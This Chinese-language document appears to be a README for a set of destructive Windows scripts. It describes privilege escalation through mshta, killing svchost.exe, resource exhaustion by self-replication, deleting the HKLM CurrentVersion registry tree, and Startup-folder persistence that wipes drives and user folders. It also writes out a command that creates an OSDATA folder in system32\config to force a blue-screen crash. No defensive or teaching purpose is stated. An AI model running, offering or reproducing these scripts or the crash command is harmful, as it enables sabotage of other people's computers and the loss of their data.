### 死机蓝屏：`system_crash.bat`
1. **权限提升**：利用 `mshta` 和 VBScript 以管理员身份重新运行脚本。
2. **进程破坏**：创建并执行 PowerShell 脚本，强制结束 `svchost.exe` 进程，导致系统不稳定。
3. **资源耗尽**：通过自我复制和无限循环，耗尽系统资源。


### 开机自启文件夹：`open_startup.vbs`
```batch
获取当前用户的启动文件夹路径并打开该文件夹，可能用于后续恶意脚本的植入。
```


### 删除注册表：`registry_delete.bat`
1. **权限提升**：以管理员身份重新运行脚本。
2. **注册表破坏**：强制删除注册表中 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion` 下的所有项，破坏系统配置。


### 删除指定磁盘文件：`data_deletion.vbs`
1. **持久化**：在当前用户的启动文件夹创建一个新的 VBScript 脚本。
2. **数据删除**：新脚本会在系统启动时等待一段时间后，删除指定磁盘分区和用户目录下的所有文件和文件夹，并最终删除自身。


## 补充蓝屏.bat
通过管理员权限运行 `cmd`，输入以下命令：
```
mkdir "C:\Windows\system32\config\OSDATA"
```
```
@echo off
mkdir "C:\Windows\system32\config\OSDATA"
```


### 第2代脚本在测试过程中遇到的问题，可能在部分情况下无法运行